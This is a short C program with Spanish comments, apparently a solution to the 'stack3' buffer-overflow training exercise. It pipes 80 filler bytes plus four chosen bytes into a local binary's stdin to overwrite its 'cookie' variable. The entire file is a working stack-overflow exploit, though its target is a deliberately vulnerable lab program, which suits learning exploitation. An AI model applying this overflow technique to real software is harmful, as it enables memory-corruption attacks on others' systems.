#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

main()
{

	char buf[80+4+1]; // 80 bytes del buffer, 4 de la variable "cookie" y 1 adicional para el '\0'
	int pipes[2];
	pid_t pidchild;

	//bytes de relleno
	memset((void *)buf,'a',80);

	//metemeos el contenido de cookie
	buf[80]=0x05;
	buf[81]=0x00;
	buf[82]=0x02;
	buf[83]=0x01;
	buf[84]='\n';
	pipe(pipes);
	fprintf(stderr,"Buscando vulnerabilidades\n");
	if( !(pidchild=fork()) ){ //devuelve el PID del proc hijo

		//cerramos la salida de la pipe, porque de aquí sólo queremos leer
		close(pipes[1]);
		//todo lo que entre en pipe, lo queremos poner al stdin (0)
		dup2(pipes[0],0);
		//cerramos el pipe de entrada, porque ya lo hemos copiado
		close(pipes[0]);

		execl("./stack3",NULL);
	}

	//cerramos la entrada de la pipe, porque de aqui solo queremos escribir
	close(pipes[0]);
	//todo lo que escribamos en stdout, lo escribiremos en la pipe de escritura
	dup2(pipes[1],1);
	//cerramos la pipe de escritura, ya que ahora se hace referencia a ella por stdout
	close(pipes[1]);

	//escribimos en nuestro stdout, que hace referencia a pipe[1],
	//la cual esta conectada con pipe[0], que corresponde al stdin
	//del proceso hijo
	write(1,buf,sizeof(buf));

	waitpid(pidchild,0,0); //esperamos a que termine el hijo
	exit(0);

}
